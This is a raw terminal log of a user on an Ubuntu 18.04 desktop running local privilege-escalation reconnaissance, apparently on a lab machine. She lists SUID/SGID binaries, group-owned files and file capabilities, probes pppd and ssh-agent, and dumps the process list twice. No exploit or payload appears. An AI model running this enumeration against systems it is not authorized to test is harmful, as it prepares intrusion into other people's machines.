lrwxrwxrwx   1 root root        31 Mar 23  2022 vmlinuz -> boot/vmlinuz-4.15.0-173-generic
lrwxrwxrwx   1 root root        30 Mar 23  2022 vmlinuz.old -> boot/vmlinuz-4.15.0-76-generic
annie@desktop:/$ ls -la /etc/passwd
-rw-r--r-- 1 root root 2034 Mar 23  2022 /etc/passwd
annie@desktop:/$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} + 2> /dev/null|cat
-rwsr-xr-x 1 root root        30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root        43088 Sep 16  2020 /bin/mount
-rwsr-xr-x 1 root root        64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root        44664 Jan 25  2022 /bin/su
-rwsr-xr-x 1 root root        26696 Sep 16  2020 /bin/umount
-rwxr-sr-x 1 root shadow      34816 Apr  8  2021 /sbin/pam_extrausers_chkpwd
-rwsr-xr-x 1 root root        10232 Nov 16  2017 /sbin/setcap
-rwxr-sr-x 1 root shadow      34816 Apr  8  2021 /sbin/unix_chkpwd
-rwsr-xr-x 1 root root        22528 Jun 28  2019 /usr/bin/arping
-rwxr-sr-x 1 root tty         14328 Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow      71816 Jan 25  2022 /usr/bin/chage
-rwsr-xr-x 1 root root        76496 Jan 25  2022 /usr/bin/chfn
-rwsr-xr-x 1 root root        44528 Jan 25  2022 /usr/bin/chsh
-rwxr-sr-x 1 root crontab     39352 Nov 15  2017 /usr/bin/crontab
-rwxr-sr-x 1 root shadow      22808 Jan 25  2022 /usr/bin/expiry
-rwsr-xr-x 1 root root        75824 Jan 25  2022 /usr/bin/gpasswd
-rwxr-sr-x 1 root mlocate     43088 Mar  1  2018 /usr/bin/mlocate
-rwsr-xr-x 1 root root        40344 Jan 25  2022 /usr/bin/newgrp
-rwsr-xr-x 1 root root        59640 Jan 25  2022 /usr/bin/passwd
-rwsr-xr-x 1 root root        22520 Jan 12  2022 /usr/bin/pkexec
-rwxr-sr-x 1 root ssh        362640 Mar  2  2020 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root       149080 Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root        18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwxr-sr-x 1 root tty         30800 Sep 16  2020 /usr/bin/wall
-rwsr-xr-- 1 root messagebus  42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwxr-sr-x 1 root mail        14336 Jul  8  2020 /usr/lib/evolution/camel-lock-helper-1.2
-rwsr-xr-x 1 root root       436552 Mar  2  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root        14328 Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwxr-sr-x 1 root utmp        10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwsr-sr-x 1 root root        10232 Dec 14  2021 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-- 1 root dip        378600 Jul 23  2020 /usr/sbin/pppd
annie@desktop:/$ /usr/bin/ssh-agent /bin/ -p
/bin/: Permission denied
annie@desktop:/$ cd /user/bin
-bash: cd: /user/bin: No such file or directory
annie@desktop:/$ cd /usr/bin
annie@desktop:/usr/bin$ ./ssh-agent /bin/ -p
/bin/: Permission denied
annie@desktop:/usr/bin$ id
uid=1000(annie) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
annie@desktop:/usr/bin$ find /etc -writable -ls 2>/dev/null
annie@desktop:/usr/bin$ find / -type f -group cdrom 2>/dev/null
annie@desktop:/usr/bin$ find / -type f -group sudo 2>/dev/null
annie@desktop:/usr/bin$ find / -type f -group dip 2>/dev/null
/usr/sbin/pppd
/etc/chatscripts/provider
/etc/ppp/peers/provider
annie@desktop:/usr/bin$ find / -type f -group plugdev 2>/dev/null
annie@desktop:/usr/bin$ find / -type f -group lpadmin 2>/dev/null
annie@desktop:/usr/bin$ find / -type f -group sambashare 2>/dev/null
annie@desktop:/usr/bin$ ls -la /usr/sbin/pppd
-rwsr-xr-- 1 root dip 378600 Jul 23  2020 /usr/sbin/pppd
annie@desktop:/usr/bin$ find -h
find: unknown predicate `-h'
annie@desktop:/usr/bin$ find --help
Usage: find [-H] [-L] [-P] [-Olevel] [-D debugopts] [path...] [expression]

default path is the current directory; default expression is -print
expression may consist of: operators, options, tests, and actions:
operators (decreasing precedence; -and is implicit where no others are given):
      ( EXPR )   ! EXPR   -not EXPR   EXPR1 -a EXPR2   EXPR1 -and EXPR2
      EXPR1 -o EXPR2   EXPR1 -or EXPR2   EXPR1 , EXPR2
positional options (always true): -daystart -follow -regextype

normal options (always true, specified before other expressions):
      -depth --help -maxdepth LEVELS -mindepth LEVELS -mount -noleaf
      --version -xdev -ignore_readdir_race -noignore_readdir_race
tests (N can be +N or -N or N): -amin N -anewer FILE -atime N -cmin N
      -cnewer FILE -ctime N -empty -false -fstype TYPE -gid N -group NAME
      -ilname PATTERN -iname PATTERN -inum N -iwholename PATTERN -iregex PATTERN
      -links N -lname PATTERN -mmin N -mtime N -name PATTERN -newer FILE
      -nouser -nogroup -path PATTERN -perm [-/]MODE -regex PATTERN
      -readable -writable -executable
      -wholename PATTERN -size N[bcwkMG] -true -type [bcdpflsD] -uid N
      -used N -user NAME -xtype [bcdpfls]      -context CONTEXT

actions: -delete -print0 -printf FORMAT -fprintf FILE FORMAT -print 
      -fprint0 FILE -fprint FILE -ls -fls FILE -prune -quit
      -exec COMMAND ; -exec COMMAND {} + -ok COMMAND ;
      -execdir COMMAND ; -execdir COMMAND {} + -okdir COMMAND ;

Valid arguments for -D:
exec, help, opt, rates, search, stat, time, tree
Use '-D help' for a description of the options, or see find(1)

Please see also the documentation at http://www.gnu.org/software/findutils/.
You can report (and track progress on fixing) bugs in the "find"
program via the GNU findutils bug-reporting page at
https://savannah.gnu.org/bugs/?group=findutils or, if
you have no web access, by sending email to <bug-findutils@gnu.org>.
annie@desktop:/usr/bin$ man find
annie@desktop:/usr/bin$ find / -type f -group sambashare -exec ls -l {} + 2>/dev/null
annie@desktop:/usr/bin$ find / -type f -group dip -exec ls -l {} + 2>/dev/null
-rw-r----- 1 root dip    656 Mar 23  2022 /etc/chatscripts/provider
-rw-r----- 1 root dip   1093 Mar 23  2022 /etc/ppp/peers/provider
-rwsr-xr-- 1 root dip 378600 Jul 23  2020 /usr/sbin/pppd
annie@desktop:/usr/bin$ pppd
pppd: The remote system is required to authenticate itself
pppd: but I couldn't find any suitable secret (password) for it to use to do so.
annie@desktop:/usr/bin$ pppd --version
pppd version 2.4.7
annie@desktop:/usr/bin$ ^C
annie@desktop:/usr/bin$ cat /etc/os-release
NAME="Ubuntu"
VERSION="18.04.6 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.6 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic
annie@desktop:/usr/bin$ find / -perm -o x -type d 2>/dev/null
annie@desktop:/usr/bin$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
annie@desktop:/usr/bin$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.8 159576  8776 ?        Ss   04:06   0:06 /sbin/init noprompt
root         2  0.0  0.0      0     0 ?        S    04:06   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   04:06   0:00 [kworker/0:0H]
root         5  0.0  0.0      0     0 ?        I    04:06   0:00 [kworker/u30:0]
root         6  0.0  0.0      0     0 ?        I<   04:06   0:00 [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    04:06   0:00 [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    04:06   0:00 [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    04:06   0:00 [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    04:06   0:00 [migration/0]
root        11  0.0  0.0      0     0 ?        S    04:06   0:00 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    04:06   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    04:06   0:00 [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   04:06   0:00 [netns]
root        15  0.0  0.0      0     0 ?        S    04:06   0:00 [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    04:06   0:00 [kauditd]
root        17  0.0  0.0      0     0 ?        S    04:06   0:00 [khungtaskd]
root        18  0.0  0.0      0     0 ?        S    04:06   0:00 [oom_reaper]
root        19  0.0  0.0      0     0 ?        I<   04:06   0:00 [writeback]
root        20  0.0  0.0      0     0 ?        S    04:06   0:00 [kcompactd0]
root        21  0.0  0.0      0     0 ?        SN   04:06   0:00 [ksmd]
root        22  0.0  0.0      0     0 ?        SN   04:06   0:00 [khugepaged]
root        23  0.0  0.0      0     0 ?        I<   04:06   0:00 [crypto]
root        24  0.0  0.0      0     0 ?        I<   04:06   0:00 [kintegrityd]
root        25  0.0  0.0      0     0 ?        I<   04:06   0:00 [kblockd]
root        26  0.0  0.0      0     0 ?        S    04:06   0:00 [xen-balloon]
root        27  0.0  0.0      0     0 ?        I<   04:06   0:00 [ata_sff]
root        28  0.0  0.0      0     0 ?        I<   04:06   0:00 [md]
root        29  0.0  0.0      0     0 ?        I<   04:06   0:00 [edac-poller]
root        30  0.0  0.0      0     0 ?        I<   04:06   0:00 [devfreq_wq]
root        31  0.0  0.0      0     0 ?        I<   04:06   0:00 [watchdogd]
root        32  0.0  0.0      0     0 ?        I    04:06   0:00 [kworker/0:1]
root        35  0.0  0.0      0     0 ?        S    04:06   0:00 [kswapd0]
root        36  0.0  0.0      0     0 ?        I<   04:06   0:00 [kworker/u31:0]
root        37  0.0  0.0      0     0 ?        S    04:06   0:00 [ecryptfs-kthrea]
root        79  0.0  0.0      0     0 ?        I<   04:06   0:00 [kthrotld]
root        80  0.0  0.0      0     0 ?        I<   04:06   0:00 [acpi_thermal_pm]
root        81  0.0  0.0      0     0 ?        S    04:06   0:00 [xenbus]
root        82  0.0  0.0      0     0 ?        S    04:06   0:00 [xenwatch]
root        83  0.0  0.0      0     0 ?        S    04:06   0:00 [scsi_eh_0]
root        84  0.0  0.0      0     0 ?        I<   04:06   0:00 [scsi_tmf_0]
root        85  0.0  0.0      0     0 ?        S    04:06   0:00 [scsi_eh_1]
root        86  0.0  0.0      0     0 ?        I<   04:06   0:00 [scsi_tmf_1]
root        92  0.0  0.0      0     0 ?        I<   04:06   0:00 [ipv6_addrconf]
root       101  0.0  0.0      0     0 ?        I<   04:06   0:00 [kstrp]
root       118  0.0  0.0      0     0 ?        I<   04:06   0:00 [charger_manager]
root       169  0.0  0.0      0     0 ?        I    04:06   0:00 [kworker/0:2]
root       189  0.0  0.0      0     0 ?        S    04:06   0:00 [jbd2/xvda1-8]
root       190  0.0  0.0      0     0 ?        I<   04:06   0:00 [ext4-rsv-conver]
root       204  0.0  0.0      0     0 ?        I<   04:06   0:00 [kworker/0:1H]
root       230  0.0  1.8 120316 19116 ?        S<s  04:07   0:02 /lib/systemd/systemd-journald
root       247  0.0  0.5  47124  5460 ?        Ss   04:07   0:01 /lib/systemd/systemd-udevd
systemd+   303  0.0  0.3 219704  3124 ?        Ssl  04:07   0:00 /lib/systemd/systemd-timesyncd
systemd+   307  0.0  0.5  79928  5148 ?        Ss   04:07   0:00 /lib/systemd/systemd-networkd
root       320  0.0  0.6 286356  6756 ?        Ssl  04:07   0:02 /usr/lib/accountsservice/accounts-daemon
root       321  0.0  1.0 502656 10296 ?        Ssl  04:07   0:00 /usr/lib/udisks2/udisksd
root       322  0.0  0.9 434320  9416 ?        Ssl  04:07   0:00 /usr/sbin/ModemManager --filter-policy=strict
root       325  0.0  0.3  11600  3216 ?        Ss   04:07   0:00 /bin/bash /root/.display10.sh
root       330  0.0  0.3  30036  3248 ?        Ss   04:07   0:00 /usr/sbin/cron -f
avahi      331  0.0  0.3  47216  3108 ?        Ss   04:07   0:00 avahi-daemon: running [desktop.local]
message+   332  0.1  0.5  50844  5424 ?        Ss   04:07   0:11 /usr/bin/dbus-daemon --system --address=systemd: --nofork --n
root       336  0.0  6.1 230576 62088 ?        S    04:07   0:06 /usr/bin/Xvfb :10 -ac -screen 0 1024x768x24
avahi      339  0.0  0.0  47084   344 ?        S    04:07   0:00 avahi-daemon: chroot helper
root       348  0.0  0.5  45240  5308 ?        Ss   04:07   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
syslog     350  0.0  0.4 271460  4464 ?        Ssl  04:07   0:00 /usr/sbin/rsyslogd -n
root       351  0.0  1.5 479228 15948 ?        Ssl  04:07   0:01 /usr/sbin/NetworkManager --no-daemon
root       353  0.0  0.5  70520  5988 ?        Ss   04:07   0:05 /lib/systemd/systemd-logind
root       354  0.0  1.6 169100 17052 ?        Ssl  04:07   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-t
root       371  0.0  0.8 292920  8628 ?        Ssl  04:07   0:01 /usr/lib/policykit-1/polkitd --no-debug
systemd+   375  0.0  0.4  70500  4884 ?        Ss   04:07   0:00 /lib/systemd/systemd-resolved
root       386  0.0  0.0      0     0 ?        I<   04:07   0:00 [ttm_swap]
root       396  0.0  0.5  72308  5696 ?        Ss   04:07   0:00 /usr/sbin/sshd -D
root       414  0.0  0.8 300052  8316 ?        Ssl  04:07   0:01 /usr/sbin/gdm3
gdm        454  0.0  0.7  76672  7772 ?        Ss   04:07   0:00 /lib/systemd/systemd --user
gdm        457  0.0  0.2 113432  2104 ?        S    04:07   0:00 (sd-pam)
root       468  0.0  0.2  14672  2336 ttyS0    Ss+  04:07   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 
gdm        507  0.0  0.4  50440  4724 ?        Ss   04:07   0:02 /usr/bin/dbus-daemon --session --address=systemd: --nofork --
root       636  0.0  0.8 305604  8404 ?        Ssl  04:07   0:00 /usr/lib/upower/upowerd
gdm        643  0.0  0.6 349324  6420 ?        Ssl  04:07   0:00 /usr/lib/at-spi2-core/at-spi-bus-launcher
gdm        648  0.0  0.4  50068  4288 ?        S    04:07   0:00 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi
gdm        653  0.0  1.2 1235428 12856 ?       Ssl  04:07   0:00 /usr/bin/pulseaudio --daemonize=no
rtkit      655  0.0  0.3 183516  3020 ?        SNsl 04:07   0:00 /usr/lib/rtkit/rtkit-daemon
root      1846  0.0  0.8 253152  8336 ?        Sl   04:10   0:00 gdm-session-worker [pam/gdm-launch-environment]
gdm       1851  0.0  0.5 203740  5960 tty1     Ssl+ 04:10   0:00 /usr/lib/gdm3/gdm-x-session gnome-session --autostart /usr/sh
gdm       1853  0.0  4.8 327608 48976 tty1     Sl+  04:10   0:08 /usr/lib/xorg/Xorg vt1 -displayfd 3 -auth /run/user/115/gdm/X
gdm       1863  0.0  1.3 624064 13320 tty1     Sl+  04:10   0:00 /usr/lib/gnome-session/gnome-session-binary --autostart /usr/
gdm       1885  0.0 16.6 2888068 167700 tty1   Sl+  04:10   0:06 /usr/bin/gnome-shell
gdm       1905  0.0  0.7 426708  7700 tty1     Sl   04:10   0:00 ibus-daemon --xim --panel disable
gdm       1911  0.0  0.6 272352  6624 tty1     Sl   04:10   0:00 /usr/lib/ibus/ibus-dconf
gdm       1914  0.0  2.0 335656 20908 tty1     Sl   04:10   0:00 /usr/lib/ibus/ibus-x11 --kill-daemon
gdm       1918  0.0  0.5 270296  5996 ?        Sl   04:10   0:00 /usr/lib/ibus/ibus-portal
root      1938  0.0  0.6 288480  6748 ?        Ssl  04:10   0:00 /usr/lib/x86_64-linux-gnu/boltd
root      1939  0.0  1.3 365188 13712 ?        Ssl  04:10   0:00 /usr/lib/packagekit/packagekitd
gdm       1940  0.0  2.1 485580 21336 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-xsettings
gdm       1941  0.0  0.5 269680  5860 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-a11y-settings
gdm       1943  0.0  2.0 335288 20132 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-clipboard
gdm       1946  0.0  2.1 650200 21600 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-color
gdm       1947  0.0  1.3 385324 13964 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-datetime
gdm       1948  0.0  0.5 275344  5564 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-housekeeping
gdm       1960  0.0  2.1 498104 21380 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-keyboard
gdm       1963  0.0  2.3 1073420 23616 tty1    Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-media-keys
gdm       1976  0.0  0.4 193604  4600 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-mouse
gdm       1977  0.0  2.1 582448 21996 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-power
gdm       1980  0.0  0.8 258628  8792 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-print-notifications
gdm       1981  0.0  0.4 193624  4672 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-rfkill
gdm       1986  0.0  0.4 267340  4772 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-screensaver-proxy
gdm       1988  0.0  0.8 296640  8252 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-sharing
gdm       1991  0.0  0.9 443320  9168 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-smartcard
gdm       2001  0.0  0.7 326496  8020 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-sound
gdm       2004  0.0  2.1 420036 21176 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-wacom
colord    2053  0.0  1.3 316116 13628 ?        Ssl  04:10   0:00 /usr/lib/colord/colord
gdm       2122  0.0  0.5 196496  5912 tty1     Sl   04:10   0:00 /usr/lib/ibus/ibus-engine-simple
root      2208  0.0  0.0      0     0 ?        I    04:10   0:00 [kworker/u30:4]
root      4116  0.0  0.0      0     0 ?        I    04:35   0:00 [kworker/u30:2]
root      4583  0.0  0.7 110084  7224 ?        Ss   04:40   0:00 sshd: annie [priv]
annie     4662  0.0  0.7  76532  7476 ?        Ss   04:41   0:00 /lib/systemd/systemd --user
annie     4663  0.0  0.2 195556  2264 ?        S    04:41   0:00 (sd-pam)
annie     4694  0.0  0.3 110084  3460 ?        S    04:41   0:00 sshd: annie@pts/0
annie     4697  0.0  0.5  21384  5036 pts/0    Ss   04:41   0:00 -bash
root     31428  0.1  1.7 665584 17940 ?        Ssl  06:48   0:00 /usr/bin/anydesk --service
gdm      31431  0.0  2.1 724204 21616 ?        Ssl  06:48   0:00 /usr/bin/anydesk --tray
annie    31454  0.0  0.3  11600  3092 ?        Ss   06:48   0:00 /bin/bash /home/annie/.anydesk.sh
annie    31455  0.2  3.0 810692 30812 ?        Sl   06:48   0:00 /usr/bin/anydesk
annie    31465  0.0  0.2  45848  2188 ?        S    06:48   0:00 dbus-launch --autolaunch=9035659da70a4b8ebcd6691cfa3ab648 --b
annie    31466  0.0  0.2  49804  2720 ?        Ss   06:48   0:00 /usr/bin/dbus-daemon --syslog-only --fork --print-pid 5 --pri
annie    31500  0.0  0.3  38380  3524 pts/0    R+   06:48   0:00 ps aux
annie@desktop:/usr/bin$ ps aux|cat
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.8 159576  8776 ?        Ss   04:06   0:06 /sbin/init noprompt
root         2  0.0  0.0      0     0 ?        S    04:06   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   04:06   0:00 [kworker/0:0H]
root         5  0.0  0.0      0     0 ?        I    04:06   0:00 [kworker/u30:0]
root         6  0.0  0.0      0     0 ?        I<   04:06   0:00 [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    04:06   0:00 [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    04:06   0:00 [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    04:06   0:00 [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    04:06   0:00 [migration/0]
root        11  0.0  0.0      0     0 ?        S    04:06   0:00 [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    04:06   0:00 [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    04:06   0:00 [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   04:06   0:00 [netns]
root        15  0.0  0.0      0     0 ?        S    04:06   0:00 [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    04:06   0:00 [kauditd]
root        17  0.0  0.0      0     0 ?        S    04:06   0:00 [khungtaskd]
root        18  0.0  0.0      0     0 ?        S    04:06   0:00 [oom_reaper]
root        19  0.0  0.0      0     0 ?        I<   04:06   0:00 [writeback]
root        20  0.0  0.0      0     0 ?        S    04:06   0:00 [kcompactd0]
root        21  0.0  0.0      0     0 ?        SN   04:06   0:00 [ksmd]
root        22  0.0  0.0      0     0 ?        SN   04:06   0:00 [khugepaged]
root        23  0.0  0.0      0     0 ?        I<   04:06   0:00 [crypto]
root        24  0.0  0.0      0     0 ?        I<   04:06   0:00 [kintegrityd]
root        25  0.0  0.0      0     0 ?        I<   04:06   0:00 [kblockd]
root        26  0.0  0.0      0     0 ?        S    04:06   0:00 [xen-balloon]
root        27  0.0  0.0      0     0 ?        I<   04:06   0:00 [ata_sff]
root        28  0.0  0.0      0     0 ?        I<   04:06   0:00 [md]
root        29  0.0  0.0      0     0 ?        I<   04:06   0:00 [edac-poller]
root        30  0.0  0.0      0     0 ?        I<   04:06   0:00 [devfreq_wq]
root        31  0.0  0.0      0     0 ?        I<   04:06   0:00 [watchdogd]
root        32  0.0  0.0      0     0 ?        I    04:06   0:00 [kworker/0:1]
root        35  0.0  0.0      0     0 ?        S    04:06   0:00 [kswapd0]
root        36  0.0  0.0      0     0 ?        I<   04:06   0:00 [kworker/u31:0]
root        37  0.0  0.0      0     0 ?        S    04:06   0:00 [ecryptfs-kthrea]
root        79  0.0  0.0      0     0 ?        I<   04:06   0:00 [kthrotld]
root        80  0.0  0.0      0     0 ?        I<   04:06   0:00 [acpi_thermal_pm]
root        81  0.0  0.0      0     0 ?        S    04:06   0:00 [xenbus]
root        82  0.0  0.0      0     0 ?        S    04:06   0:00 [xenwatch]
root        83  0.0  0.0      0     0 ?        S    04:06   0:00 [scsi_eh_0]
root        84  0.0  0.0      0     0 ?        I<   04:06   0:00 [scsi_tmf_0]
root        85  0.0  0.0      0     0 ?        S    04:06   0:00 [scsi_eh_1]
root        86  0.0  0.0      0     0 ?        I<   04:06   0:00 [scsi_tmf_1]
root        92  0.0  0.0      0     0 ?        I<   04:06   0:00 [ipv6_addrconf]
root       101  0.0  0.0      0     0 ?        I<   04:06   0:00 [kstrp]
root       118  0.0  0.0      0     0 ?        I<   04:06   0:00 [charger_manager]
root       169  0.0  0.0      0     0 ?        I    04:06   0:00 [kworker/0:2]
root       189  0.0  0.0      0     0 ?        S    04:06   0:00 [jbd2/xvda1-8]
root       190  0.0  0.0      0     0 ?        I<   04:06   0:00 [ext4-rsv-conver]
root       204  0.0  0.0      0     0 ?        I<   04:06   0:00 [kworker/0:1H]
root       230  0.0  1.9 120316 19196 ?        S<s  04:07   0:02 /lib/systemd/systemd-journald
root       247  0.0  0.5  47124  5460 ?        Ss   04:07   0:01 /lib/systemd/systemd-udevd
systemd+   303  0.0  0.3 219704  3124 ?        Ssl  04:07   0:00 /lib/systemd/systemd-timesyncd
systemd+   307  0.0  0.5  79928  5148 ?        Ss   04:07   0:00 /lib/systemd/systemd-networkd
root       320  0.0  0.6 286356  6756 ?        Ssl  04:07   0:02 /usr/lib/accountsservice/accounts-daemon
root       321  0.0  1.0 502656 10296 ?        Ssl  04:07   0:00 /usr/lib/udisks2/udisksd
root       322  0.0  0.9 434320  9416 ?        Ssl  04:07   0:00 /usr/sbin/ModemManager --filter-policy=strict
root       325  0.0  0.3  11600  3216 ?        Ss   04:07   0:00 /bin/bash /root/.display10.sh
root       330  0.0  0.3  30036  3248 ?        Ss   04:07   0:00 /usr/sbin/cron -f
avahi      331  0.0  0.3  47216  3108 ?        Ss   04:07   0:00 avahi-daemon: running [desktop.local]
message+   332  0.1  0.5  50844  5424 ?        Ss   04:07   0:11 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       336  0.0  6.1 230576 61992 ?        S    04:07   0:06 /usr/bin/Xvfb :10 -ac -screen 0 1024x768x24
avahi      339  0.0  0.0  47084   344 ?        S    04:07   0:00 avahi-daemon: chroot helper
root       348  0.0  0.5  45240  5308 ?        Ss   04:07   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
syslog     350  0.0  0.4 271460  4464 ?        Ssl  04:07   0:00 /usr/sbin/rsyslogd -n
root       351  0.0  1.5 479228 15948 ?        Ssl  04:07   0:01 /usr/sbin/NetworkManager --no-daemon
root       353  0.0  0.5  70520  5988 ?        Ss   04:07   0:05 /lib/systemd/systemd-logind
root       354  0.0  1.6 169100 17052 ?        Ssl  04:07   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       371  0.0  0.8 292920  8628 ?        Ssl  04:07   0:01 /usr/lib/policykit-1/polkitd --no-debug
systemd+   375  0.0  0.4  70500  4884 ?        Ss   04:07   0:00 /lib/systemd/systemd-resolved
root       386  0.0  0.0      0     0 ?        I<   04:07   0:00 [ttm_swap]
root       396  0.0  0.5  72308  5696 ?        Ss   04:07   0:00 /usr/sbin/sshd -D
root       414  0.0  0.8 300052  8316 ?        Ssl  04:07   0:01 /usr/sbin/gdm3
gdm        454  0.0  0.7  76672  7772 ?        Ss   04:07   0:00 /lib/systemd/systemd --user
gdm        457  0.0  0.2 113432  2104 ?        S    04:07   0:00 (sd-pam)
root       468  0.0  0.2  14672  2336 ttyS0    Ss+  04:07   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
gdm        507  0.0  0.4  50440  4724 ?        Ss   04:07   0:02 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       636  0.0  0.8 305604  8404 ?        Ssl  04:07   0:00 /usr/lib/upower/upowerd
gdm        643  0.0  0.6 349324  6420 ?        Ssl  04:07   0:00 /usr/lib/at-spi2-core/at-spi-bus-launcher
gdm        648  0.0  0.4  50068  4288 ?        S    04:07   0:00 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
gdm        653  0.0  1.2 1235428 12856 ?       Ssl  04:07   0:00 /usr/bin/pulseaudio --daemonize=no
rtkit      655  0.0  0.3 183516  3020 ?        SNsl 04:07   0:00 /usr/lib/rtkit/rtkit-daemon
root      1846  0.0  0.8 253152  8336 ?        Sl   04:10   0:00 gdm-session-worker [pam/gdm-launch-environment]
gdm       1851  0.0  0.5 203740  5960 tty1     Ssl+ 04:10   0:00 /usr/lib/gdm3/gdm-x-session gnome-session --autostart /usr/share/gdm/greeter/autostart
gdm       1853  0.0  4.8 327608 48976 tty1     Sl+  04:10   0:08 /usr/lib/xorg/Xorg vt1 -displayfd 3 -auth /run/user/115/gdm/Xauthority -background none -noreset -keeptty -verbose 3
gdm       1863  0.0  1.3 624064 13320 tty1     Sl+  04:10   0:00 /usr/lib/gnome-session/gnome-session-binary --autostart /usr/share/gdm/greeter/autostart
gdm       1885  0.0 16.6 2888068 167700 tty1   Sl+  04:10   0:06 /usr/bin/gnome-shell
gdm       1905  0.0  0.7 426708  7700 tty1     Sl   04:10   0:00 ibus-daemon --xim --panel disable
gdm       1911  0.0  0.6 272352  6624 tty1     Sl   04:10   0:00 /usr/lib/ibus/ibus-dconf
gdm       1914  0.0  2.0 335656 20908 tty1     Sl   04:10   0:00 /usr/lib/ibus/ibus-x11 --kill-daemon
gdm       1918  0.0  0.5 270296  5996 ?        Sl   04:10   0:00 /usr/lib/ibus/ibus-portal
root      1938  0.0  0.6 288480  6748 ?        Ssl  04:10   0:00 /usr/lib/x86_64-linux-gnu/boltd
root      1939  0.0  1.3 365188 13712 ?        Ssl  04:10   0:00 /usr/lib/packagekit/packagekitd
gdm       1940  0.0  2.1 485580 21336 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-xsettings
gdm       1941  0.0  0.5 269680  5860 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-a11y-settings
gdm       1943  0.0  2.0 335288 20132 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-clipboard
gdm       1946  0.0  2.1 650200 21600 tty1     Sl+  04:10   0:00 /usr/lib/gnome-settings-daemon/gsd-color
